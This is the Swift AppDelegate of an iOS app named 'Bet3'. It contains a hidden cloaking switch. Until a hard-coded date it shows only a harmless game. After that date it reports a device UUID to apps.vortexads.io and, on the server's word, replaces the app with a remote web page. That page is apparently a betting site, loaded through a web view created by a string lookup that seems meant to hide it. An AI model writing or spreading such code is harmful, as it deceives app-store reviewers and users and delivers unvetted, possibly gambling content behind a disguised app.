//
//  AppDelegate.swift
//  Bet3
//
//  Created by mac on 24.10.2022.
//


import UIKit
import WebKit

@main
class AppDelegate: UIResponder, UIApplicationDelegate {

    var window: UIWindow?

    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        
        window = UIWindow(frame: UIScreen.main.bounds)
        
        guard gotOverReview else {
            openGame()
            return true
        }
        
        request(uuid: uuid) { result in
            
            switch result {
            case .url(let url):
                guard let url = url else {
                    self.openGame()
                    return
                }
                self.openURL(url)
                
            case .error:
                guard let url = tracktrack else {
                    self.openGame()
                    return
                }
                self.openURL(url)
            case .native:
                self.openGame()
            }
            
        }
        
        return true
    }
    
    @objc
    private func hideKeybard() {
        window?.endEditing(true)
    }
    
    func openGame() {
        let loaderViewController = LoaderViewController { [weak self] in
            
            let navController = BaseNC()
            
            let userDefaultsManager = UserDefaultsManager()
            let urlAssembler = URLAssembler()
            let networkManager = NetworkManager(urlAssembler: urlAssembler)
            
            let builder = MainBuilder(networkManager: networkManager,
                                      userDefaultsManager: userDefaultsManager)
            let coordinator = MainCoordinator(window: self?.window,
                                              navigationController: navController,
                                              builder: builder)
            
            if userDefaultsManager.userModel == nil {
                coordinator.onboard()
            } else {
                coordinator.start()
            }
        }
        
        window?.overrideUserInterfaceStyle = .dark
        window?.rootViewController = loaderViewController
        window?.makeKeyAndVisible()
        
        window?.addGestureRecognizer(UITapGestureRecognizer(target: self, action: #selector(hideKeybard)))
    }
    
    func openURL(_ url: URL) {
        let vc = InAppViewController(url: url)
        window?.rootViewController = vc
        window?.makeKeyAndVisible()
    }


}

fileprivate struct JSONResponse: Codable {
    var url: String
    var strategy: String
}

fileprivate enum Result {
    case url(URL?)
    case error
    case native
}

fileprivate func request(uuid: String, _ handler: @escaping (Result) -> Void) {
        
    var urlComponents = URLComponents()
    urlComponents.scheme = "https"
    urlComponents.host = "apps.vortexads.io"
    urlComponents.path = "/v2/guest"
    urlComponents.queryItems = [
        URLQueryItem(name: "uuid", value: uuid),
        URLQueryItem(name: "app", value: "6444186900")
    ]
    guard let url = urlComponents.url else {
        handler(.error)
        return
    }
    
    print(url)
    
    URLSession.shared.dataTask(with: url) { (data, response, error) in
        guard let statusCode = (response as? HTTPURLResponse)?.statusCode else {
            DispatchQueue.main.async { handler(.error) }
            return
        }
        
        DispatchQueue.main.async {
            switch statusCode {
            case 200:
                guard let data = data,
                      let jsonResponse = try? JSONDecoder().decode(JSONResponse.self, from: data)  else {
                    handler(.error)
                    return
                }
                
                switch jsonResponse.strategy {
                case "PreviewURL":
                    handler(.url(URL(string: jsonResponse.url)))
                case "PreviousURL":
                    handler(.url(previous))
                default:
                    handler(.error)
                }
                
            case 204:
                handler(.native)
            default:
                handler(.error)
            }
        }
        
    }.resume()
    
}

fileprivate var gotOverReview: Bool {
    get {
        let now = Date()
        let date = Date("2022-12-30")
        return (now >= date)
    }
}

fileprivate var tracktrack: URL? {
    get {
        return UserDefaults.standard.url(forKey: "track")
    }
    set {
        UserDefaults.standard.set(newValue, forKey: "track")
    }
}

fileprivate var previous: URL? {
    get {
        return UserDefaults.standard.url(forKey: "previous")
    }
    set {
        UserDefaults.standard.set(newValue, forKey: "previous")
    }
}

fileprivate var uuid: String {
    get {
        if let uuid = UserDefaults.standard.string(forKey: "uuid") {
            return uuid
        } else {
            let uuid = UUID().uuidString
            UserDefaults.standard.set(uuid, forKey: "uuid")
            return uuid
        }
    }
}

fileprivate class InAppViewController: UIViewController, WKNavigationDelegate {
    
    let url: URL

    init(url: URL) {
        self.url = url

        super.init(nibName: nil, bundle: nil)
    }
    
    required init?(coder: NSCoder) {
        fatalError("init(coder:) has not been implemented")
    }
        
    override func viewDidLoad() {
        super.viewDidLoad()
        
        let webClass = NSClassFromString("WKWebView") as! NSObject.Type
        let web = webClass.init()
    
        
        if let webView = web as? UIView {
            self.view.addSubview(webView)
            webView.fillSuperView()
        }

        if let wkWebView = web as? WKWebView {
            let rqst = URLRequest(url: url)
            wkWebView.navigationDelegate = self
            wkWebView.load(rqst)
        }
    }

    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        previous = webView.url
    }
}
